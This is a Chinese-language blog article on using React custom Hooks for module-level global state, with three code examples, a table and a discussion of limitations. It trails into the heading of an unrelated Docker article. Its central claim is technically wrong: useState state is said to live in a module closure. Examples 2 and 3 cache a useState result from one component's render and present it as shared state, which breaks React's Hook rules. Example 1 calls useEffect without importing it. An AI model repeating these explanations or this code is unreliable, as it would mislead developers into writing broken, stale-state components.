                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 React 开发中，状态管理是核心需求之一。从简单的组件内 state，到 Context API、Redux 等全局状态方案，开发者一直在根据场景选择合适的方案。而自定义 Hook 作为 React 的核心特性，因其复用逻辑的能力，常常被开发者尝试用于全局状态管理。但随之而来的疑问是：自定义 Hook 真的能实现模块级全局状态吗？为什么能这么做？每次引入后内部的 state 会重新初始化吗？本文将从原理、示例、细节三个维度，彻底解答这些问题。</p>
<h2 data-id="heading-0">一、先明确结论</h2>
<ol>
<li><strong>自定义 Hook 可以实现模块级全局状态管理</strong>，但有适用场景（小型应用、非复杂状态）；</li>
<li>其核心原理是<strong>模块级作用域的闭包缓存</strong>—— 状态被存储在模块的闭包中，而非组件实例，因此跨组件复用 Hook 时能共享同一状态；</li>
<li>每次组件引入并调用该 Hook 时，<strong>内部的 state 不会重新执行初始化</strong>，而是复用模块闭包中缓存的状态（仅组件渲染时重新执行 Hook 的逻辑，但 state 引用不变）。</li>
</ol>
<h2 data-id="heading-1">二、为什么自定义 Hook 能实现全局状态？核心原理拆解</h2>
<p>要理解这个问题，需要先理清两个关键概念：<strong>模块作用域</strong>和<strong>React Hook 的执行机制</strong>。</p>
<h3 data-id="heading-2">1. 模块作用域：状态的 “全局容器”</h3>
<p>在 ES6 模块系统中，每个<code>.js</code>文件都是一个独立的模块，模块内的变量、函数会形成<strong>模块级作用域</strong>—— 即模块被导入时，会先执行一次初始化，之后所有导入该模块的地方，共享的是同一个模块实例，模块内的变量不会被重复创建。</p>
<h3 data-id="heading-3">2. React Hook 的 “状态绑定”：依赖闭包而非组件实例</h3>
<p>React 的<code>useState</code>、<code>useEffect</code>等 Hook，其状态是<strong>与组件渲染实例绑定</strong>的吗？表面看是，但如果将 Hook 的逻辑抽离到模块中，结合模块作用域，情况会发生变化：</p>
<p>当我们在模块中定义一个自定义 Hook，并在 Hook 内部调用<code>useState</code>时，这个<code>useState</code>的状态<strong>并不会绑定到某个具体组件</strong>，而是绑定到 “模块级闭包” 中。因为：</p>
<ul>
<li>模块初始化时，自定义 Hook 的函数定义被创建，其内部的<code>useState</code>调用会形成一个闭包；</li>
<li>无论哪个组件导入并调用这个 Hook，本质上都是执行同一个模块中的 Hook 函数，共享同一个闭包环境；</li>
<li>因此，所有组件通过该 Hook 访问的<code>state</code>和<code>setState</code>，都是同一个闭包中的状态和更新函数 —— 这就实现了 “全局共享”。</li>
</ul>
<h3 data-id="heading-4">3. 关键区别：普通自定义 Hook vs 全局状态自定义 Hook</h3>
<p>普通自定义 Hook（如<code>useCounter</code>）通常是 “组件私有” 的，因为它们的<code>useState</code>是在组件调用 Hook 时初始化的，每个组件调用一次 Hook，就会创建一个独立的状态。</p>
<p>而<strong>全局状态自定义 Hook</strong>的核心差异是：将<code>useState</code>的初始化逻辑，通过模块作用域 “提升” 到了模块层面，使得所有组件调用 Hook 时，复用同一个<code>useState</code>的结果。</p>
<h2 data-id="heading-5">三、实战示例：用自定义 Hook 实现模块级全局状态</h2>
<p>下面通过 3 个递进示例，从基础实现到进阶用法，展示自定义 Hook 的全局状态能力，并验证 “状态不重复初始化” 的特性。</p>
<h3 data-id="heading-6">示例 1：基础版全局状态 Hook（共享用户信息）</h3>
<p>需求：实现一个全局用户状态，支持登录、登出，在多个组件中共享用户信息。</p>
<h4 data-id="heading-7">步骤 1：定义全局状态 Hook（模块级）</h4>
<p>创建<code>useGlobalUser.js</code>文件，作为全局状态模块</p>
<pre><code class="hljs language-ini" lang="ini">// useGlobalUser.js（模块级全局状态Hook）
import { useState, useCallback } from 'react'<span class="hljs-comment">;</span>

// 模块作用域的变量：存储用户状态（闭包缓存）
let <span class="hljs-attr">globalUserState</span> = null<span class="hljs-comment">;</span>
// 存储所有订阅组件的更新函数（用于状态变更时通知组件重渲染）
let <span class="hljs-attr">subscribers</span> = new Set()<span class="hljs-comment">;</span>

// 触发所有订阅组件重渲染
const <span class="hljs-attr">notifySubscribers</span> = () =&gt; {
  subscribers.forEach(<span class="hljs-attr">update</span> =&gt; update())<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

// 自定义Hook：供组件调用
export function useGlobalUser() {
  // 每个组件调用Hook时，创建一个本地的更新函数（触发组件重渲染）
  const <span class="hljs-section">[, forceUpdate]</span> = useState({})<span class="hljs-comment">;</span>

  // 组件挂载时订阅，卸载时取消订阅
  useEffect(() =&gt; {
    subscribers.add(forceUpdate)<span class="hljs-comment">;</span>
    return () =&gt; {
      subscribers.delete(forceUpdate)<span class="hljs-comment">;</span>
    }<span class="hljs-comment">;</span>
  }, <span class="hljs-section">[forceUpdate]</span>)<span class="hljs-comment">;</span>

  // 登录：更新全局状态并通知所有订阅组件
  const <span class="hljs-attr">login</span> = useCallback((userInfo) =&gt; {
    <span class="hljs-attr">globalUserState</span> = { ...userInfo }<span class="hljs-comment">;</span>
    notifySubscribers()<span class="hljs-comment">; // 触发所有组件重渲染</span>
  }, <span class="hljs-section">[]</span>)<span class="hljs-comment">;</span>

  // 登出：重置全局状态
  const <span class="hljs-attr">logout</span> = useCallback(() =&gt; {
    <span class="hljs-attr">globalUserState</span> = null<span class="hljs-comment">;</span>
    notifySubscribers()<span class="hljs-comment">;</span>
  }, <span class="hljs-section">[]</span>)<span class="hljs-comment">;</span>

  // 返回全局状态和操作方法
  return {
    user: globalUserState,
    login,
    logout,
    isLogin: !!globalUserState
  }<span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-8">步骤 2：在多个组件中使用该 Hook</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Header组件</span>
<span class="hljs-keyword">import</span> { useGlobalUser } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalUser'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { user, isLogin, logout } = <span class="hljs-title function_">useGlobalUser</span>();
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Header组件渲染：'</span>, user); <span class="hljs-comment">// 验证是否共享状态</span>

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>网站头部<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      {isLogin ? (
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
          欢迎 {user.name} <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{logout}</span>&gt;</span>登出<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      ) : (
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>未登录<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// Login组件</span>
<span class="hljs-keyword">import</span> { useGlobalUser } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalUser'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Login</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { login } = <span class="hljs-title function_">useGlobalUser</span>();

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 模拟登录接口返回的用户信息</span>
    <span class="hljs-title function_">login</span>({ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-attr">avatar</span>: <span class="hljs-string">'xxx.png'</span> });
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleLogin}</span>&gt;</span>模拟登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// 主页组件</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Header</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./Header'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Login</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./Login'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Login</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h4 data-id="heading-9">效果验证：</h4>
<ol>
<li>初始状态：Header 显示 “未登录”，控制台打印<code>Header组件渲染：null</code>；</li>
<li>点击 “模拟登录”：Login 组件调用<code>login</code>更新全局状态，<code>notifySubscribers</code>触发 Header 组件重渲染；</li>
<li>最终效果：Header 显示 “欢迎张三”，控制台打印<code>Header组件渲染：{id:1, name:"张三", ...}</code>；</li>
<li>核心结论：Header 和 Login 组件通过<code>useGlobalUser</code>共享了同一个<code>user</code>状态，状态变更时所有使用该 Hook 的组件都会同步更新。</li>
</ol>
<h3 data-id="heading-10">示例 2：优化版：用 useState 替代模块变量（更符合 React 规范）</h3>
<p>示例 1 中直接用模块变量<code>globalUserState</code>存储状态，虽然可行，但不够 “React 化”。我们可以用<code>useState</code>替代模块变量，利用 React 的状态管理机制自动处理更新：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// useGlobalUser优化版.js</span>
<span class="hljs-keyword">import</span> { useState, useCallback, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">// 模块作用域：存储全局状态的Hook实例（闭包缓存）</span>
<span class="hljs-keyword">let</span> globalHook = <span class="hljs-literal">null</span>;

<span class="hljs-comment">// 全局状态的核心Hook（仅初始化一次）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createGlobalUserHook</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-keyword">const</span> login = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">userInfo</span>) =&gt;</span> {
    <span class="hljs-title function_">setUser</span>({ ...userInfo });
  }, []);

  <span class="hljs-keyword">const</span> logout = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">setUser</span>(<span class="hljs-literal">null</span>);
  }, []);

  <span class="hljs-keyword">return</span> {
    user,
    login,
    logout,
    <span class="hljs-attr">isLogin</span>: !!user,
    <span class="hljs-comment">// 暴露setUser供订阅逻辑使用（或直接用user作为依赖）</span>
    <span class="hljs-attr">subscribe</span>: <span class="hljs-function">(<span class="hljs-params">callback</span>) =&gt;</span> {
      <span class="hljs-comment">// 这里利用React的状态更新机制，无需手动维护订阅者</span>
      <span class="hljs-comment">// 组件通过useEffect依赖user，自动触发重渲染</span>
    }
  };
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useGlobalUser</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 模块初始化时，创建全局Hook实例（仅执行一次）</span>
  <span class="hljs-keyword">if</span> (!globalHook) {
    globalHook = <span class="hljs-title function_">createGlobalUserHook</span>();
  }

  <span class="hljs-comment">// 返回全局状态和方法（所有组件共享同一个实例）</span>
  <span class="hljs-keyword">return</span> globalHook;
}
</code></pre>
<h4 data-id="heading-11">优化点说明：</h4>
<ul>
<li>用<code>useState</code>替代模块变量，利用 React 的状态管理机制，无需手动维护订阅者（组件通过依赖<code>user</code>自动重渲染）；</li>
<li><code>globalHook</code>在模块作用域中仅初始化一次，所有组件调用<code>useGlobalUser</code>时返回的是同一个实例，因此状态完全共享。</li>
</ul>
<h3 data-id="heading-12">示例 3：进阶版：支持多状态、批量更新（类似简易 Context）</h3>
<p>如果需要管理多个全局状态（如用户、主题、权限），可以扩展为 “多状态全局 Hook”：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// useGlobalState.js（通用全局状态Hook）</span>
import { useState, useCallback, useEffect } from 'react';

<span class="hljs-comment">// 模块作用域：存储所有全局状态（key-value形式）</span>
const globalStates = new <span class="hljs-built_in">Map</span>();
<span class="hljs-comment">// 存储每个状态的订阅者</span>
const subscribers = new <span class="hljs-built_in">Map</span>();

<span class="hljs-comment">// 创建或获取全局状态</span>
function <span class="hljs-built_in">getOrCreateGlobalState</span>(key, initialValue) {
  <span class="hljs-comment">// 如果状态已存在，直接返回</span>
  if (globalStates.has(key)) {
    return globalStates<span class="hljs-selector-class">.get</span>(key);
  }

  <span class="hljs-comment">// 新建状态</span>
  const <span class="hljs-selector-attr">[state, setState]</span> = <span class="hljs-built_in">useState</span>(initialValue);

  <span class="hljs-comment">// 批量更新（类似setState的函数式更新）</span>
  const setGlobalState = <span class="hljs-built_in">useCallback</span>((updater) =&gt; {
    <span class="hljs-built_in">setState</span>(prev =&gt; {
      const nextState = typeof updater === 'function' ? updater(prev) : updater;
      <span class="hljs-comment">// 通知该状态的所有订阅者</span>
      if (subscribers.has(key)) {
        subscribers<span class="hljs-selector-class">.get</span>(key)<span class="hljs-selector-class">.forEach</span>(update =&gt; update(nextState));
      }
      return nextState;
    });
  }, <span class="hljs-selector-attr">[key]</span>);

  const globalState = { state, setGlobalState };
  globalStates<span class="hljs-selector-class">.set</span>(key, globalState);
  subscribers<span class="hljs-selector-class">.set</span>(key, new Set());

  return globalState;
}

<span class="hljs-comment">// 通用全局Hook：支持传入key和初始值</span>
export function <span class="hljs-built_in">useGlobalState</span>(key, initialValue) {
  const { state, setGlobalState } = <span class="hljs-built_in">getOrCreateGlobalState</span>(key, initialValue);

  <span class="hljs-comment">// 组件本地更新函数（触发组件重渲染）</span>
  const <span class="hljs-selector-attr">[, forceUpdate]</span> = <span class="hljs-built_in">useState</span>(state);

  <span class="hljs-comment">// 订阅状态变更：状态更新时触发组件重渲染</span>
  <span class="hljs-built_in">useEffect</span>(() =&gt; {
    const subs = subscribers<span class="hljs-selector-class">.get</span>(key);
    const update = (nextState) =&gt; <span class="hljs-built_in">forceUpdate</span>(nextState);
    subs<span class="hljs-selector-class">.add</span>(update);

    <span class="hljs-comment">// 初始触发一次渲染（同步初始状态）</span>
    <span class="hljs-built_in">forceUpdate</span>(state);

    return () =&gt; subs<span class="hljs-selector-class">.delete</span>(update);
  }, <span class="hljs-selector-attr">[key, state]</span>);

  return <span class="hljs-selector-attr">[state, setGlobalState]</span>;
}
</code></pre>
<h4 data-id="heading-13">使用方式：</h4>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 组件1：使用用户状态</span>
<span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useGlobalState</span>(<span class="hljs-string">'user'</span>, <span class="hljs-literal">null</span>);

<span class="hljs-comment">// 组件2：使用主题状态</span>
<span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useGlobalState</span>(<span class="hljs-string">'theme'</span>, <span class="hljs-string">'light'</span>);

<span class="hljs-comment">// 组件3：更新全局状态</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChangeTheme</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">setTheme</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev === <span class="hljs-string">'light'</span> ? <span class="hljs-string">'dark'</span> : <span class="hljs-string">'light'</span>);
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">setUser</span>({ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'李四'</span> });
};
</code></pre>
<h4 data-id="heading-14">进阶特性：</h4>
<ul>
<li>支持多状态隔离（通过<code>key</code>区分）；</li>
<li>支持函数式更新（批量修改状态）；</li>
<li>组件仅订阅自己关注的状态，性能更优。</li>
</ul>
<h2 data-id="heading-15">四、关键疑问解答：每次引入 Hook，state 会重新执行吗？</h2>
<p>这是开发者最关心的问题，我们结合示例和原理来详细解答：</p>
<h3 data-id="heading-16">1. 结论：不会重新初始化，但会重新执行 Hook 逻辑</h3>
<ul>
<li><strong>state 的初始化：仅执行一次</strong>：因为<code>globalHook</code>、<code>globalStates</code>等变量存储在<strong>模块作用域</strong>中，模块被导入时仅初始化一次，后续所有组件引入该模块并调用 Hook 时，不会重新创建这些变量，因此<code>useState</code>的初始化逻辑（<code>useState(initialValue)</code>）仅执行一次；</li>
<li><strong>Hook 逻辑的执行：每次组件渲染都会执行</strong>：组件每次重渲染时，都会重新调用自定义 Hook（如<code>useGlobalUser()</code>），但 Hook 内部的逻辑（如返回<code>globalHook</code>）是 “读取缓存”，而非 “重新创建状态”—— 因此 state 的引用不变，不会触发不必要的更新。</li>
</ul>
<h3 data-id="heading-17">2. 代码验证：打印日志看执行次数</h3>
<p>修改<code>useGlobalUser</code>优化版，添加日志：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// useGlobalUser.js</span>
<span class="hljs-keyword">import</span> { useState, useCallback } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">let</span> globalHook = <span class="hljs-literal">null</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'模块初始化：执行一次'</span>); <span class="hljs-comment">// 仅打印一次</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createGlobalUserHook</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'创建全局状态：仅执行一次'</span>); <span class="hljs-comment">// 仅打印一次</span>
  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// ... 其余逻辑</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useGlobalUser</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'调用useGlobalUser：组件渲染时执行'</span>); <span class="hljs-comment">// 组件每次渲染都会打印</span>

  <span class="hljs-keyword">if</span> (!globalHook) {
    globalHook = <span class="hljs-title function_">createGlobalUserHook</span>();
  }

  <span class="hljs-keyword">return</span> globalHook;
}
</code></pre>
<h4 data-id="heading-18">日志输出结果：</h4>
<ol>
<li>应用启动时：打印<code>模块初始化：执行一次</code>；</li>
<li>第一个组件（如 Header）挂载时：打印<code>调用useGlobalUser：组件渲染时执行</code> → <code>创建全局状态：仅执行一次</code>；</li>
<li>第二个组件（如 Login）挂载时：打印<code>调用useGlobalUser：组件渲染时执行</code>（无 “创建全局状态” 日志）；</li>
<li>组件重渲染时（如登录后）：两个组件都会打印<code>调用useGlobalUser：组件渲染时执行</code>（仍无 “创建全局状态” 日志）。</li>
</ol>
<h4 data-id="heading-19">结论验证：</h4>
<ul>
<li>模块初始化和全局状态创建仅执行一次（state 不会重新初始化）；</li>
<li>Hook 函数本身会在组件每次渲染时执行，但仅读取缓存的状态，不会重复创建。</li>
</ul>
<h3 data-id="heading-20">3. 与普通 Hook 的区别：状态存储位置不同</h3>






























<table><thead><tr><th>特性</th><th>普通自定义 Hook（如 useCounter）</th><th>全局状态自定义 Hook（如 useGlobalUser）</th></tr></thead><tbody><tr><td>状态存储位置</td><td>组件实例的 Hook 链表中</td><td>模块作用域的闭包中</td></tr><tr><td>状态共享性</td><td>组件私有（每个组件调用创建独立状态）</td><td>跨组件共享（所有组件调用共享同一状态）</td></tr><tr><td>state 初始化次数</td><td>每个组件调用一次</td><td>模块初始化时仅一次</td></tr><tr><td>Hook 逻辑执行次数</td><td>组件每次渲染执行</td><td>组件每次渲染执行（但仅读缓存）</td></tr></tbody></table>
<h2 data-id="heading-21">五、自定义 Hook 作为全局状态的适用场景与局限性</h2>
<h3 data-id="heading-22">1. 适用场景</h3>
<ul>
<li>小型应用或中型应用的非核心状态（如用户信息、主题、权限、全局加载状态）；</li>
<li>不需要中间件、时间旅行、状态回溯等高级特性；</li>
<li>追求轻量化、无额外依赖（无需引入 Redux、Zustand 等库）；</li>
<li>跨组件共享简单状态，且组件层级不深（无需 Context 的嵌套传递）。</li>
</ul>
<h3 data-id="heading-23">2. 局限性</h3>
<ul>
<li><strong>不支持服务端渲染（SSR）</strong> ：模块作用域的状态在 SSR 中会被所有请求共享，导致状态污染（因为 SSR 是多请求共享一个模块实例）；</li>
<li><strong>状态更新缺乏可追踪性</strong>：没有 Redux DevTools 等工具支持，难以调试状态变更；</li>
<li><strong>不支持复杂状态逻辑</strong>：如异步状态流、状态依赖、批量更新优化等，需要手动实现，成本较高；</li>
<li><strong>组件卸载后状态不自动清理</strong>：模块作用域的状态会一直存在于内存中，直到应用刷新（可能导致内存泄漏，需手动清理）；</li>
<li><strong>不支持状态切片隔离</strong>：多团队协作时，容易出现状态 key 冲突（需手动规范 key 命名）。</li>
</ul>
<h2 data-id="heading-24">六、总结</h2>
<p>自定义 Hook 之所以能实现模块级全局状态，核心是<strong>模块作用域的闭包缓存</strong>—— 状态被存储在模块层面，而非组件实例，因此跨组件调用 Hook 时能共享同一状态。每次引入 Hook 后，state 不会重新初始化（仅模块初始化时执行一次），但 Hook 逻辑会在组件每次渲染时执行（仅读取缓存，无性能开销）。</p>
<p>这种方案是一把 “双刃剑”：它轻量化、易实现，适合简单场景；但缺乏高级特性和调试能力，不适合复杂应用。在实际开发中，可根据项目规模选择：</p>
<ul>
<li>小型应用 / 简单状态：用自定义 Hook（本文方案）；</li>
<li>中型应用 / 需要调试：用 Zustand、Jotai 等轻量状态库（本质是基于自定义 Hook + 闭包实现）；</li>
<li>大型应用 / 复杂状态流：用 Redux、Redux Toolkit 或 Recoil 等成熟方案。</li>
</ul>
<p>理解自定义 Hook 的全局状态原理，不仅能帮助我们灵活应对不同场景，更能深入掌握 React 的模块机制、闭包和 Hook 执行逻辑，提升 React 开发的底层认知。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 Docker Compose 到 Docker Swarm：RocketMQ 微服务项目集群部署实战指南]]></title>    <link>https://juejin.cn/post/7575735719077314566</link>    <guid>https://juejin.cn/post/7575735719077314566</guid>    <pubDate>2025-11-24T06:49:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575735719077314566" data-draft-id="7575910333400285238" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 Docker Compose 到 Docker Swarm：RocketMQ 微服务项目集群部署实战指南"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T06:49:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT橘子皮"/> <meta itemprop="url" content="https://juejin.cn/user/3148645291002232"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 Docker Compose 到 Docker Swarm：RocketMQ 微服务项目集群部署实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3148645291002232/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT橘子皮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:49:27.000Z" title="Mon Nov 24 2025 06:49:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
